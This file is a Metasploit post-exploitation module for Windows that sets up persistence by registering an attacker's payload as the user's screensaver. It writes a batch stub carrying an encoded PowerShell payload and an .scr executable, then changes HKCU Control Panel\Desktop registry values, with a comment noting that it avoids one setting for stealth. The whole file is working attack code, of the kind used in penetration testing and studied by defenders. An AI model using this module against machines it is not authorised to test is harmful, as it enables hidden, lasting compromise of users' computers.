##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/file'
require 'msf/core/exploit/powershell'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Windows::Registry
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'User Screensaver Persistence',
      'Description'    => %q{
        This module will install a payload as the screensaver for a
        user by creating the setting in the registry to execute a
        specific screensaver executable.
        Any PE (.exe) can be renamed to .scr and set as the screensaver,
        however for this module the .scr file is simply a stub to run
        a .bat file, which kicks off the payload, then the original user
        screensaver.  The screensaver requires /s to run (no flags shows
        the settings).

        No payload handler is used due to the variable screensaver timeout
        length.  One must be started independent of this module.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'h00die',
        ],
      'Platform'       => [ 'win' ],
      'SessionTypes'   => [ 'meterpreter', 'shell' ],
      'Targets'        =>
        [
          [ 'Automatic', { } ]
        ],
      'References'     =>
        [
          ['URL', 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1180/T1180.md'],
          ['URL', 'https://attack.mitre.org/techniques/T1180/'],
          ['URL', 'https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf'],
          ['URL', 'https://en.wikipedia.org/wiki/Screensaver#Microsoft_Windows'],
          ['URL', 'https://support.microsoft.com/en-us/help/185348/how-to-change-the-logon-screen-saver-in-windows']
        ],
      'DisclosureDate' => "Aug 7 2017",
      'DefaultOptions' =>
        {
          'DisablePayloadHandler' => true,
          'PrependFork' => 'true',
          'EXITFUNC'    => 'process',
          'AppendExit'  => true
        },

    ))

    register_options([
      OptString.new('WritableDir', [ true, 'A directory where we can write files', 'C:\\ProgramData\\' ]),
      OptString.new('SCREENSAVER', [ false, 'Screensaver .scr file name without extension.  Blank will randomly generate', '' ]),
      OptInt.new('SCREENSAVETIMEOUT', [ true, 'Seconds till screensaver becomes active', 0 ])
    ])
  end

  def exploit

    def screensaver
      datastore['SCREENSAVER'].empty? ? rand_text_alphanumeric(5..10) : datastore['SCREENSAVER']
    end

    reg_root = 'HKEY_CURRENT_USER\Control Panel\Desktop'

    undo_script = []

    # check pre-altered values and create an undo script
    keys = registry_enumvals(reg_root)
    # we removed 'ScreenSaverIsSecure' to leave them the same as the system originally had it
    # this is a much more stealthy tactic
    ['SCRNSAVE.EXE', 'ScreenSaveTimeOut', 'ScreenSaveActive'].each do |value|
      if keys.include?(value)
        data = registry_getvaldata(reg_root, value)
        undo_script << "reg.exe add \"#{reg_root}\" /v #{value} /t REG_SZ /d #{data} /f"
        print_status("Original #{value} value: #{data}")
      else
        undo_script << "reg.exe delete \"#{reg_root}\" /v #{value} /f"
      end
    end
    print_good("Script to revert changes:\n#{undo_script.join("\n")}")

    # upload payload, attempt 1 as binary
    #payload = "#{datastore['WritableDir']}#{rand_text_alphanumeric 5..10}.exe"
    #print_status("Writing payload to #{payload}")
    #write_file(payload, generate_payload_exe)
    # upload payload, attempt 2 as powershell script
    #ps1 = "#{datastore['WritableDir']}#{rand_text_alphanumeric 5..10}.ps1"
    #print_status("Writing payload to #{ps1}")
    #write_file(ps1, payload.encoded)

    # upload batch file, we use this to start our shell, then the original screensaver
    bat = "@echo off\r\n"
    # attempt 3 bind the powershell payload directly in
    bat << "#{cmd_psh_payload(payload.encoded, payload_instance.arch.first, remove_comspec: true)};\r\n"
    #bat << "start /B #{payload}\r\n"
    #bat << "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile #{ps1}\r\n"
    bat << "start /B #{registry_getvaldata(reg_root, 'SCRNSAVE.EXE')} /s\r\n"

    batch_file = "#{datastore['WritableDir']}#{rand_text_alphanumeric 5..10}.bat"
    print_status("Writing stub to #{batch_file}")
    write_file(batch_file, bat)

    # lastly we create a scr file (exe) which we use to run the batch file
    exe_file = "#{datastore['WritableDir']}#{screensaver}.scr"
    print_status("Writing scr stub to #{exe_file}")
    exec_payload = Msf::PayloadGenerator.new(
      {
         :payload => 'windows/exec',
         :framework => framework,
         :format => 'exe-small',
         :badchars => '\x00',
         #:arch => 'x86',
         :arch => payload_instance.arch.first,
         :platform => 'Windows',
         :datastore => {'CMD'=>batch_file}
      }
    ).generate_payload
    write_file(exe_file, exec_payload)

    print_status('Changing screensaver')
    # enable screensaver
    registry_setvaldata(reg_root, 'ScreenSaveActive', '1', 'REG_SZ')
    # change screen saver timeout if needed
    unless datastore['SCREENSAVETIMEOUT'] == 0
      registry_setvaldata(reg_root, 'ScreenSaveTimeOut', datastore['SCREENSAVETIMEOUT'].to_s, 'REG_SZ')
    end
    registry_setvaldata(reg_root, 'SCRNSAVE.EXE', exe_file, 'REG_SZ')
    #registry_setvaldata(reg_root, 'SCRNSAVE.EXE', payload, 'REG_SZ')

    # we now force the update to be recognized without a reboot, however (as mentioned on posts on the Internet)
    # this doesn't seem to be reliable (which was verified in testing), and one solution seems to be just
    # running it lots of times, so we run ten times.  There's also no feedback to tell if it was a success
    # or not.
    # https://superuser.com/questions/398605/how-to-force-windows-desktop-background-to-update-or-refresh
    5.times {cmd_exec('RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters')}
    5.times {cmd_exec('RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters 1, True')}
    print_good('Screensaver set!')
  end
end

